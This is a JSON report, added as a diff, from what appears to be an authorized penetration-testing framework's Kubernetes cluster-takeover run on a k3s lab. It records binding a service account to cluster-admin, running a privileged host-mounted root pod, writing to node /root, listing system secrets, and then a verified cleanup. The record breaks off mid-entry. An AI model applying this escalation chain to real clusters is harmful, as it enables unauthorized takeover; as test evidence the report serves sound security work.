@@ -1,0 +1,1222 @@
+{
+  "schema": "trident.objective.proof/v1",
+  "chain": "cluster-takeover-objective",
+  "generated_at": 1792948702.5456097,
+  "run": "objective-cluster-takeover-objective-20261026-011707-real-20261026-10",
+  "marker": "real-20261026-10",
+  "marker_name": "TRIDENT-PROOF-real-20261026-10",
+  "backend": {
+    "kind": "kubectl",
+    "real_cluster": true,
+    "note": "real Kubernetes API"
+  },
+  "gates": {
+    "ok": true,
+    "gates": [
+      {
+        "gate": "授权闸门",
+        "status": "pass",
+        "detail": "level=全影响演示；窗口=时间窗有效（2026-01-01 00:00:00 – 2026-12-31 23:59:59）"
+      },
+      {
+        "gate": "范围闸门",
+        "status": "pass",
+        "detail": "namespace=trident-killchain；host=未声明"
+      },
+      {
+        "gate": "备份闸门",
+        "status": "pass",
+        "detail": "5 个写阶段均有快照目标；目录可写"
+      }
+    ],
+    "auto_approve_allowed": true,
+    "level": "全影响演示",
+    "namespaces": [
+      "trident-killchain"
+    ],
+    "cidrs": [
+      "127.0.0.1/32",
+      "10.0.0.0/8"
+    ],
+    "window": "时间窗有效（2026-01-01 00:00:00 – 2026-12-31 23:59:59）",
+    "consent_sha256": "2e3d94d1121e703f9d24a0993ab99269c8adf6639133d325dc9172ba416beabf"
+  },
+  "complete": true,
+  "failed_stage": null,
+  "cancelled": false,
+  "stages": [
+    {
+      "index": 1,
+      "id": "stage-1-entry",
+      "status": "success",
+      "started_at": 1792948629.9046457,
+      "finished_at": 1792948630.5933976,
+      "timeout_s": 90.0,
+      "backups": [],
+      "evidence": {
+        "readyz": {
+          "ok": true,
+          "stdout": "ok",
+          "stderr": ""
+        },
+        "nodes": [
+          {
+            "name": "k3s",
+            "ready": true,
+            "kubelet": "v1.36.5+k3s1",
+            "os": "Alpine Linux v3.24",
+            "kernel": "6.18.58-0-virt",
+            "containerRuntime": "containerd://2.3.4-k3s1.36",
+            "internalIP": "fec0::5054:ff:fe12:3456",
+            "labels": {
+              "beta.kubernetes.io/arch": "amd64",
+              "beta.kubernetes.io/instance-type": "k3s",
+              "beta.kubernetes.io/os": "linux",
+              "kubernetes.io/arch": "amd64",
+              "kubernetes.io/hostname": "k3s",
+              "kubernetes.io/os": "linux",
+              "node-role.kubernetes.io/control-plane": "true",
+              "node.kubernetes.io/instance-type": "k3s"
+            }
+          }
+        ],
+        "services": {
+          "count": 6,
+          "exposed": [
+            {
+              "namespace": "trident-killchain",
+              "name": "trident-entry-api",
+              "type": "NodePort",
+              "clusterIP": "10.43.197.93",
+              "port": 8000,
+              "nodePort": 30081,
+              "targetPort": 8000
+            },
+            {
+              "namespace": "trident-proof",
+              "name": "mock-target",
+              "type": "NodePort",
+              "clusterIP": "10.43.41.60",
+              "port": 8000,
+              "nodePort": 30080,
+              "targetPort": 8000
+            }
+          ]
+        },
+        "entry": {
+          "url": "http://127.0.0.1:28080/",
+          "http": {
+            "url": "http://127.0.0.1:28080/",
+            "status": 200,
+            "body": "ok",
+            "error": null
+          },
+          "service": {
+            "namespace": "trident-killchain",
+            "name": "trident-entry-api",
+            "type": "NodePort",
+            "clusterIP": "10.43.197.93",
+            "port": 8000,
+            "nodePort": 30081,
+            "targetPort": 8000
+          }
+        },
+        "operator": {
+          "subject": "system:serviceaccount:trident-killchain:trident-operator",
+          "namespace": "trident-killchain",
+          "can_create_rolebindings": true,
+          "can_create_clusterrolebindings": true
+        }
+      },
+      "artifact": "objective/stage-1-entry.json",
+      "artifact_sha256": "a3d42b1dbf65330bc085c2d30d71ce3bea6aee9245c6b43c8a25402f53c88e84",
+      "archive": "steps/stage-1-entry.tar.gz"
+    },
+    {
+      "index": 2,
+      "id": "stage-2-credential",
+      "status": "success",
+      "started_at": 1792948630.734041,
+      "finished_at": 1792948631.3178806,
+      "timeout_s": 60.0,
+      "backups": [],
+      "evidence": {
+        "token": {
+          "sha256_prefix": "626a7a9be1047acd",
+          "last4": "XCdg",
+          "length": 989
+        },
+        "whoami": {
+          "username": "system:serviceaccount:trident-killchain:trident-operator",
+          "uid": "ad428e66-805b-4cb3-903a-5d585867a515",
+          "groups": [
+            "system:serviceaccounts",
+            "system:serviceaccounts:trident-killchain",
+            "system:authenticated"
+          ],
+          "extra": {
+            "authentication.kubernetes.io/credential-id": [
+              "JTI=3032816e-6b0c-4e89-bb9c-329316a89349"
+            ]
+          }
+        },
+        "can_i": {
+          "create_rolebindings": true,
+          "create_clusterrolebindings": true
+        },
+        "credential_branches": {
+          "service_account_token": "executed (TokenRequest)",
+          "default_service_account_token": "discovered read-only; not used",
+          "irsa": "not applicable (no eks.amazonaws.com/role-arn annotation)",
+          "default_key": "not executed: credential files are never read by this objective"
+        }
+      },
+      "artifact": "objective/stage-2-credential.json",
+      "artifact_sha256": "99df02d8d5b8253ce50b2cec941a1d4a6b2af62ca171df9321c1c8797499601f",
+      "archive": "steps/stage-2-credential.tar.gz"
+    },
+    {
+      "index": 3,
+      "id": "stage-3-rbac-escalation",
+      "status": "success",
+      "started_at": 1792948631.4370618,
+      "finished_at": 1792948632.643119,
+      "timeout_s": 60.0,
+      "backups": [
+        {
+          "backup_id": 1,
+          "target": {
+            "kind": "kube",
+            "resource": "rolebinding",
+            "name": "trident-pwn-rb-<proof-marker>",
+            "namespace": "trident-killchain"
+          },
+          "absent": true,
+          "path": "backups/objective-stage-3-rbac-escalation-0.json",
+          "sha256": "94cf252a8554e0a0d0a12e0b6bc5cb32fda92d81e740597584dfdb2d78fcdb2c"
+        },
+        {
+          "backup_id": 2,
+          "target": {
+            "kind": "kube",
+            "resource": "clusterrolebinding",
+            "name": "trident-pwn-crb-<proof-marker>",
+            "namespace": ""
+          },
+          "absent": true,
+          "path": "backups/objective-stage-3-rbac-escalation-1.json",
+          "sha256": "41c9f5c0c25b0ed96b62d67804ff7029c4d22da745d35cc1fbb1f7094c56ef90"
+        }
+      ],
+      "evidence": {
+        "rolebinding": {
+          "apiVersion": "rbac.authorization.k8s.io/v1",
+          "kind": "RoleBinding",
+          "metadata": {
+            "annotations": {
+              "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"RoleBinding\",\"metadata\":{\"annotations\":{},\"labels\":{\"trident.io/objective\":\"real-20261026-10\"},\"name\":\"trident-pwn-rb-real-20261026-10\",\"namespace\":\"trident-killchain\"},\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"},\"subjects\":[{\"kind\":\"ServiceAccount\",\"name\":\"trident-operator\",\"namespace\":\"trident-killchain\"}]}\n"
+            },
+            "creationTimestamp": "2026-10-25T17:17:12Z",
+            "labels": {
+              "trident.io/objective": "real-20261026-10"
+            },
+            "name": "trident-pwn-rb-real-20261026-10",
+            "namespace": "trident-killchain",
+            "resourceVersion": "29116",
+            "uid": "7be8cedd-795a-4116-b91c-392cb3743c54"
+          },
+          "roleRef": {
+            "apiGroup": "rbac.authorization.k8s.io",
+            "kind": "ClusterRole",
+            "name": "cluster-admin"
+          },
+          "subjects": [
+            {
+              "kind": "ServiceAccount",
+              "name": "trident-operator",
+              "namespace": "trident-killchain"
+            }
+          ]
+        },
+        "clusterrolebinding": {
+          "apiVersion": "rbac.authorization.k8s.io/v1",
+          "kind": "ClusterRoleBinding",
+          "metadata": {
+            "annotations": {
+              "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"ClusterRoleBinding\",\"metadata\":{\"annotations\":{},\"labels\":{\"trident.io/objective\":\"real-20261026-10\"},\"name\":\"trident-pwn-crb-real-20261026-10\"},\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"},\"subjects\":[{\"kind\":\"ServiceAccount\",\"name\":\"trident-operator\",\"namespace\":\"trident-killchain\"}]}\n"
+            },
+            "creationTimestamp": "2026-10-25T17:17:12Z",
+            "labels": {
+              "trident.io/objective": "real-20261026-10"
+            },
+            "name": "trident-pwn-crb-real-20261026-10",
+            "resourceVersion": "29118",
+            "uid": "78b21b4d-ab53-455a-96e0-6cf5d1d6145f"
+          },
+          "roleRef": {
+            "apiGroup": "rbac.authorization.k8s.io",
+            "kind": "ClusterRole",
+            "name": "cluster-admin"
+          },
+          "subjects": [
+            {
+              "kind": "ServiceAccount",
+              "name": "trident-operator",
+              "namespace": "trident-killchain"
+            }
+          ]
+        },
+        "can_i": {
+          "all": true,
+          "create_namespace": true,
+          "get_all_secrets": true
+        },
+        "role": "cluster-admin"
+      },
+      "artifact": "objective/stage-3-rbac-escalation.json",
+      "artifact_sha256": "57694216f88eac4a4238835628ecca3832895d835752f1220e94b13ac31be8e9",
+      "archive": "steps/stage-3-rbac-escalation.tar.gz"
+    },
+    {
+      "index": 4,
+      "id": "stage-4-privileged-pod",
+      "status": "success",
+      "started_at": 1792948632.758378,
+      "finished_at": 1792948637.5440714,
+      "timeout_s": 180.0,
+      "backups": [
+        {
+          "backup_id": 3,
+          "target": {
+            "kind": "kube",
+            "resource": "pod",
+            "name": "trident-pwn-pod-<proof-marker>",
+            "namespace": "trident-killchain"
+          },
+          "absent": true,
+          "path": "backups/objective-stage-4-privileged-pod-0.json",
+          "sha256": "123d1dc0c4608a849968b1e75d073678f152f81350b5bbede96d3eb837524db5"
+        }
+      ],
+      "evidence": {
+        "pod": {
+          "name": "trident-pwn-pod-real-20261026-10",
+          "namespace": "trident-killchain",
+          "nodeName": "k3s",
+          "phase": "Running"
+        },
+        "verified": {
+          "privileged": true,
+          "hostPID": true,
+          "hostPath": "/",
+          "uid": 0
+        }
+      },
+      "artifact": "objective/stage-4-privileged-pod.json",
+      "artifact_sha256": "270d4c33f4b7189add78cb2a8a895353b9ad841cb81c55fa522a6433b2c6ca95",
+      "archive": "steps/stage-4-privileged-pod.tar.gz"
+    },
+    {
+      "index": 5,
+      "id": "stage-5-node-marker",
+      "status": "success",
+      "started_at": 1792948637.6737006,
+      "finished_at": 1792948640.619608,
+      "timeout_s": 120.0,
+      "backups": [
+        {
+          "backup_id": 4,
+          "target": {
+            "kind": "node-file",
+            "path": "/root/TRIDENT-PROOF-<proof-marker>",
+            "via": "trident-pwn-pod-<proof-marker>"
+          },
+          "absent": true,
+          "path": "backups/objective-stage-5-node-marker-0.json",
+          "sha256": "be418db0147dc367fbe6067d050d643978e665a1722dc5c644413934534ffaf5"
+        }
+      ],
+      "evidence": {
+        "pod": "trident-pwn-pod-real-20261026-10",
+        "uid": "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)",
+        "node_hostname": "k3s",
+        "node_root_listing": "drwx------    5 root     root          4096 Oct 25 16:59 /host/root",
+        "marker": {
+          "path": "/root/TRIDENT-PROOF-real-20261026-10",
+          "content": "TRIDENT-PROOF-real-20261026-10|node=k3s|ts=1792948639",
+          "sha256": "29bc79c339ac9bd5abced0cf94ba160b471ce7bdd9534548872990534527a211",
+          "readback_match": true,
+          "verified": true
+        }
+      },
+      "artifact": "objective/stage-5-node-marker.json",
+      "artifact_sha256": "ba7d35d238d7de7e200e9e32fd4baf479f1d3afe9e4f21e0ef184e614dd9c409",
+      "archive": "steps/stage-5-node-marker.tar.gz"
+    },
+    {
+      "index": 6,
+      "id": "stage-6-cluster-proof",
+      "status": "success",
+      "started_at": 1792948640.7360666,
+      "finished_at": 1792948642.4413857,
+      "timeout_s": 90.0,
+      "backups": [
+        {
+          "backup_id": 5,
+          "target": {
+            "kind": "kube",
+            "resource": "namespace",
+            "name": "trident-proof-<proof-marker>",
+            "namespace": ""
+          },
+          "absent": true,
+          "path": "backups/objective-stage-6-cluster-proof-0.json",
+          "sha256": "d321f76402f409fbd4bdd87803703fc91fa08cb9f8119740b398fcfdcd089b9f"
+        },
+        {
+          "backup_id": 6,
+          "target": {
+            "kind": "kube",
+            "resource": "configmap",
+            "name": "trident-proof",
+            "namespace": "trident-proof-<proof-marker>"
+          },
+          "absent": true,
+          "path": "backups/objective-stage-6-cluster-proof-1.json",
+          "sha256": "ae498b78549ef85ae02a866e99691ffa95731d0f4bc834b585c593c369e2434e"
+        }
+      ],
+      "evidence": {
+        "secrets": {
+          "count": 2,
+          "namespaces": [
+            "kube-system"
+          ],
+          "names": [
+            "kube-system/k3s-serving",
+            "kube-system/k3s.node-password.k3s"
+          ]
+        },
+        "test_namespace": {
+          "name": "trident-proof-real-20261026-10",
+          "created": true
+        },
+        "test_configmap": {
+          "name": "trident-proof",
+          "namespace": "trident-proof-real-20261026-10",
+          "read_back": true,
+          "data": {
+            "marker": "TRIDENT-PROOF-real-20261026-10",
+            "node": "k3s",
+            "objective": "cluster-takeover-objective",
+            "secret_count": "2"
+          }
+        },
+        "node_marker_readback": "TRIDENT-PROOF-real-20261026-10|node=k3s|ts=1792948639",
+        "nodes": [
+          {
+            "name": "k3s",
+            "ready": true,
+            "kubelet": "v1.36.5+k3s1",
+            "os": "Alpine Linux v3.24",
+            "kernel": "6.18.58-0-virt",
+            "containerRuntime": "containerd://2.3.4-k3s1.36",
+            "internalIP": "fec0::5054:ff:fe12:3456",
+            "labels": {
+              "beta.kubernetes.io/arch": "amd64",
+              "beta.kubernetes.io/instance-type": "k3s",
+              "beta.kubernetes.io/os": "linux",
+              "kubernetes.io/arch": "amd64",
+              "kubernetes.io/hostname": "k3s",
+              "kubernetes.io/os": "linux",
+              "node-role.kubernetes.io/control-plane": "true",
+              "node.kubernetes.io/instance-type": "k3s"
+            }
+          }
+        ]
+      },
+      "artifact": "objective/stage-6-cluster-proof.json",
+      "artifact_sha256": "53550568fdfae994bd7723d2adbeb9df079c3890e0f48777805b1a537ef9522d",
+      "archive": "steps/stage-6-cluster-proof.tar.gz"
+    },
+    {
+      "index": 7,
+      "id": "stage-7-cleanup",
+      "status": "success",
+      "started_at": 1792948642.569993,
+      "finished_at": 1792948702.4246917,
+      "timeout_s": 180.0,
+      "backups": [
+        {
+          "backup_id": 7,
+          "target": {
+            "kind": "kube",
+            "resource": "clusterrolebinding",
+            "name": "trident-pwn-crb-<proof-marker>",
+            "namespace": ""
+          },
+          "absent": false,
+          "path": "backups/objective-stage-7-cleanup-0.json",
+          "sha256": "e1539fa9550273bfec2d75825363a32fd66bcde17343c0b28db9c5f168720f8a"
+        },
+        {
+          "backup_id": 8,
+          "target": {
+            "kind": "kube",
+            "resource": "rolebinding",
+            "name": "trident-pwn-rb-<proof-marker>",
+            "namespace": "trident-killchain"
+          },
+          "absent": false,
+          "path": "backups/objective-stage-7-cleanup-1.json",
+          "sha256": "05213211d2a51ab8c5a800a1f65a8cd46b52a6a9ff805cfa911fdfa9f3fdb0b1"
+        },
+        {
+          "backup_id": 9,
+          "target": {
+            "kind": "kube",
+            "resource": "pod",
+            "name": "trident-pwn-pod-<proof-marker>",
+            "namespace": "trident-killchain"
+          },
+          "absent": false,
+          "path": "backups/objective-stage-7-cleanup-2.json",
+          "sha256": "4f8dc63e3bee89fdc1d852555f20689221209a1ba63acc10af78a77fdf6d7b0b"
+        },
+        {
+          "backup_id": 10,
+          "target": {
+            "kind": "node-file",
+            "path": "/root/TRIDENT-PROOF-<proof-marker>",
+            "via": "trident-pwn-pod-<proof-marker>"
+          },
+          "absent": false,
+          "path": "backups/objective-stage-7-cleanup-3.json",
+          "sha256": "fcbba631a39c0ee08fa9477129dd8a0beaf09719963c2ee667d859a69f7230cb"
+        }
+      ],
+      "evidence": {
+        "verified": true,
+        "checks": [
+          {
+            "check": "node marker",
+            "path": "/root/TRIDENT-PROOF-real-20261026-10",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "namespace trident-proof-real-20261026-10 absent",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "clusterrolebinding trident-pwn-crb-real-20261026-10 absent",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "rolebinding trident-pwn-rb-real-20261026-10 absent",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "pod trident-pwn-pod-real-20261026-10 absent",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "fixture-clusterrolebinding trident-operator-broad absent",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "fixture-clusterrole trident-operator-broad absent",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "fixture-namespace trident-killchain absent",
+            "ok": true,
+            "observed": "absent"
+          },
+          {
+            "check": "namespace set equals baseline",
+            "ok": true,
+            "observed": {
+              "expected": [
+                "default",
+                "kube-node-lease",
+                "kube-public",
+                "kube-system",
+                "trident-proof"
+              ],
+              "actual": [
+                "default",
+                "kube-node-lease",
+                "kube-public",
+                "kube-system",
+                "trident-proof"
+              ]
+            }
+          },
+          {
+            "check": "secret name set equals baseline",
+            "ok": true,
+            "observed": {
+              "expected_count": 2,
+              "actual_count": 2,
+              "delta": []
+            }
+          },
+          {
+            "check": "no objective clusterrolebinding",
+            "ok": true,
+            "observed": []
+          }
+        ],
+        "residue": [],
+        "baseline": {
+          "namespaces": [
+            "default",
+            "kube-node-lease",
+            "kube-public",
+            "kube-system",
+            "trident-killchain",
+            "trident-proof"
+          ],
+          "secrets": [
+            {
+              "namespace": "kube-system",
+              "name": "k3s-serving",
+              "type": "kubernetes.io/tls"
+            },
+            {
+              "namespace": "kube-system",
+              "name": "k3s.node-password.k3s",
+              "type": "k3s.cattle.io/node-password"
+            }
+          ],
+          "clusterrolebindings": [
+            "cluster-admin",
+            "clustercidrs-node",
+            "k3s-cloud-controller-manager",
+            "k3s-cloud-controller-manager-auth-delegator",
+            "kube-apiserver-kubelet-admin",
+            "local-path-provisioner-bind",
+            "system:basic-user",
+            "system:controller:attachdetach-controller",
+            "system:controller:certificate-controller",
+            "system:controller:clusterrole-aggregation-controller",
+            "system:controller:cronjob-controller",
+            "system:controller:daemon-set-controller",
+            "system:controller:deployment-controller",
+            "system:controller:device-taint-eviction-controller",
+            "system:controller:disruption-controller",
+            "system:controller:endpoint-controller",
+            "system:controller:endpointslice-controller",
+            "system:controller:endpointslicemirroring-controller",
+            "system:controller:ephemeral-volume-controller",
+            "system:controller:expand-controller",
+            "system:controller:generic-garbage-collector",
+            "system:controller:horizontal-pod-autoscaler",
+            "system:controller:job-controller",
+            "system:controller:legacy-service-account-token-cleaner",
+            "system:controller:namespace-controller",
+            "system:controller:node-controller",
+            "system:controller:persistent-volume-binder",
+            "system:controller:pod-garbage-collector",
+            "system:controller:pv-protection-controller",
+            "system:controller:pvc-protection-controller",
+            "system:controller:replicaset-controller",
+            "system:controller:replication-controller",
+            "system:controller:resource-claim-controller",
+            "system:controller:resourcequota-controller",
+            "system:controller:root-ca-cert-publisher",
+            "system:controller:route-controller",
+            "system:controller:selinux-warning-controller",
+            "system:controller:service-account-controller",
+            "system:controller:service-cidrs-controller",
+            "system:controller:service-controller",
+            "system:controller:statefulset-controller",
+            "system:controller:ttl-after-finished-controller",
+            "system:controller:ttl-controller",
+            "system:controller:validatingadmissionpolicy-status-controller",
+            "system:controller:volumeattributesclass-protection-controller",
+            "system:coredns",
+            "system:discovery",
+            "system:k3s-controller",
+            "system:kube-controller-manager",
+            "system:kube-dns",
+            "system:kube-scheduler",
+            "system:monitoring",
+            "system:node",
+            "system:node-proxier",
+            "system:public-info-viewer",
+            "system:service-account-issuer-discovery",
+            "system:volume-scheduler",
+            "trident-operator-broad"
+          ],
+          "captured_at": 1792948629.9046457
+        },
+        "fixture_cleanup": true,
+        "generated_at": 1792948702.4246917,
+        "receipt": "objective-cleanup.json"
+      },
+      "artifact": "objective/stage-7-cleanup.json",
+      "artifact_sha256": "3775120b8ad947e12c952e3c61d36cb74cfae7ee7b2d4c9162ee916d4255ee81",
+      "archive": "steps/stage-7-cleanup.tar.gz"
+    }
+  ],
+  "highest_privilege": {
+    "rbac": {
+      "role": "cluster-admin",
+      "rolebinding": "trident-pwn-rb-real-20261026-10",
+      "clusterrolebinding": "trident-pwn-crb-real-20261026-10",
+      "can_i": {
+        "all": true,
+        "create_namespace": true,
+        "get_all_secrets": true
+      }
+    },
+    "node_root": {
+      "node": "k3s",
+      "uid": "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)",
+      "path": "/root/TRIDENT-PROOF-real-20261026-10",
+      "sha256": "29bc79c339ac9bd5abced0cf94ba160b471ce7bdd9534548872990534527a211",
+      "verified": true
+    },
+    "cluster_secrets": {
+      "count": 2,
+      "namespaces": [
+        "kube-system"
+      ],
+      "names": [
+        "kube-system/k3s-serving",
+        "kube-system/k3s.node-password.k3s"
+      ]
+    },
+    "test_namespace": {
+      "name": "trident-proof-real-20261026-10",
+      "created": true
+    },
+    "test_configmap": {
+      "name": "trident-proof",
+      "namespace": "trident-proof-real-20261026-10",
+      "read_back": true,
+      "data": {
+        "marker": "TRIDENT-PROOF-real-20261026-10",
+        "node": "k3s",
+        "objective": "cluster-takeover-objective",
+        "secret_count": "2"
+      }
+    },
+    "node_marker_readback": "TRIDENT-PROOF-real-20261026-10|node=k3s|ts=1792948639"
+  },
+  "cluster_actions": [
+    {
+      "stage": "stage-3-rbac-escalation",
+      "verb": "create",
+      "resource": "rolebinding",
+      "namespace": "trident-killchain",
+      "name": "trident-pwn-rb-real-20261026-10",
+      "result": "{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"RoleBinding\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"rbac.authorization.k8s.io/v1\\\",\\\"kind\\\":\\\"RoleBinding\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"labels\\\":{\\\"trident.io/objective\\\":\\\"real-2026",
+      "mutates": true,
+      "at": 1792948631.9935744,
+      "sha256": "d386e7574edcff4e06e986b6d72c5127d64cd5032155c1c22544c9e9e8cc743c"
+    },
+    {
+      "stage": "stage-3-rbac-escalation",
+      "verb": "create",
+      "resource": "clusterrolebinding",
+      "namespace": "",
+      "name": "trident-pwn-crb-real-20261026-10",
+      "result": "{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"ClusterRoleBinding\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"rbac.authorization.k8s.io/v1\\\",\\\"kind\\\":\\\"ClusterRoleBinding\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"labels\\\":{\\\"trident.io/objective",
+      "mutates": true,
+      "at": 1792948632.113333,
+      "sha256": "771a76e0d14406ea87717c6184ce34895bf9bedd2dd2e9239a0abb3fcd2579ba"
+    },
+    {
+      "stage": "stage-4-privileged-pod",
+      "verb": "create",
+      "resource": "pod",
+      "namespace": "trident-killchain",
+      "name": "trident-pwn-pod-real-20261026-10",
+      "result": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"labels\\\":{\\\"app\\\":\\\"trident-proof\\\",\\\"trident.io/objective\\\":\\\"real-20261026-10\\\"},\\\"name\\\":\\\"trident-pwn-pod-real",
+      "mutates": true,
+      "at": 1792948633.1697266,
+      "sha256": "e9c4549f7712e2340e895d9945d12f637e9b228334d4b97e9f92574f61165aee"
+    },
+    {
+      "stage": "stage-5-node-marker",
+      "verb": "exec",
+      "resource": "pods",
+      "namespace": "trident-killchain",
+      "name": "trident-pwn-pod-real-20261026-10",
+      "result": "{\"op\":\"write-node-marker\",\"path\":\"/root/TRIDENT-PROOF-real-20261026-10\",\"sha256\":\"29bc79c339ac9bd5abced0cf94ba160b471ce7bdd9534548872990534527a211\"}",
+      "mutates": true,
+      "at": 1792948640.619608,
+      "sha256": "99feb7f5185fa31490c47f7f8417487f153960077bd244e96c3f0f1be8206c6d"
+    },
+    {
+      "stage": "stage-6-cluster-proof",
+      "verb": "create",
+      "resource": "namespace",
+      "namespace": "",
+      "name": "trident-proof-real-20261026-10",
+      "result": "{\"apiVersion\":\"v1\",\"kind\":\"Namespace\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Namespace\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"labels\\\":{\\\"trident.io/objective\\\":\\\"real-20261026-10\\\"},\\\"name\\\":\\\"trident-proof-real-20261026-10\\\"}}",
+      "mutates": true,
+      "at": 1792948641.8473167,
+      "sha256": "76fbea290841cc9b6ed7454c3b8bff968cdfbb9a7a890f15cca285016efa9684"
+    },
+    {
+      "stage": "stage-6-cluster-proof",
+      "verb": "create",
+      "resource": "configmap",
+      "namespace": "trident-proof-real-20261026-10",
+      "name": "trident-proof",
+      "result": "{\"apiVersion\":\"v1\",\"data\":{\"marker\":\"TRIDENT-PROOF-real-20261026-10\",\"node\":\"k3s\",\"objective\":\"cluster-takeover-objective\",\"secret_count\":\"2\"},\"kind\":\"ConfigMap\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"data\\\":{\\\"marker\\\":\\\"TRIDENT-PROOF",
+      "mutates": true,
+      "at": 1792948642.2215972,
+      "sha256": "490e892b0069e877248d1286823b4c46a66a87da4c41a5f6a8e8f41a4f44d55d"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "exec",
+      "resource": "pods",
+      "namespace": "trident-killchain",
+      "name": "trident-pwn-pod-real-20261026-10",
+      "result": "{\"op\":\"remove-node-marker\",\"path\":\"/root/TRIDENT-PROOF-real-20261026-10\"}",
+      "mutates": true,
+      "at": 1792948645.0997672,
+      "sha256": "a84716713ffd3c664ea27a9c9f79fb37fc740efe6422da7613f1da374f963681"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "configmap",
+      "namespace": "trident-proof-real-20261026-10",
+      "name": "trident-proof",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948645.7370527,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "namespace",
+      "namespace": "",
+      "name": "trident-proof-real-20261026-10",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948652.0924315,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "clusterrolebinding",
+      "namespace": "",
+      "name": "trident-pwn-crb-real-20261026-10",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948652.3250487,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "rolebinding",
+      "namespace": "trident-killchain",
+      "name": "trident-pwn-rb-real-20261026-10",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948652.5573742,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "pod",
+      "namespace": "trident-killchain",
+      "name": "trident-pwn-pod-real-20261026-10",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948655.2741814,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "clusterrolebinding",
+      "namespace": "",
+      "name": "trident-operator-broad",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948655.636016,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "clusterrole",
+      "namespace": "",
+      "name": "trident-operator-broad",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948655.9439375,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "serviceaccount",
+      "namespace": "trident-killchain",
+      "name": "trident-operator",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948656.2061348,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    },
+    {
+      "stage": "stage-7-cleanup",
+      "verb": "delete",
+      "resource": "namespace",
+      "namespace": "",
+      "name": "trident-killchain",
+      "result": "deleted",
+      "mutates": true,
+      "at": 1792948700.9078727,
+      "sha256": "1185f37d33b0f89e331f101a51bb8e51165c7efda15950b86a3ebcbb363f898e"
+    }
+  ],
+  "read_actions": [
+    {
+      "stage": "stage-1-entry",
+      "verb": "list",
+      "resource": "services",
+      "namespace": "",
+      "name": "",
+      "result": "{\"count\":6,\"exposed\":2}",
+      "mutates": false,
+      "at": 1792948630.5933976,
+      "sha256": "be99f62a0bc0de7f0d447f05e49c180ccab3d6506c334e61d5aeeb6cca96896d"
+    },
+    {
+      "stage": "stage-1-entry",
+      "verb": "get",
+      "resource": "serviceaccount",
+      "namespace": "trident-killchain",
+      "name": "trident-operator",
+      "result": "{\"subject\":\"system:serviceaccount:trident-killchain:trident-operator\"}",
+      "mutates": false,
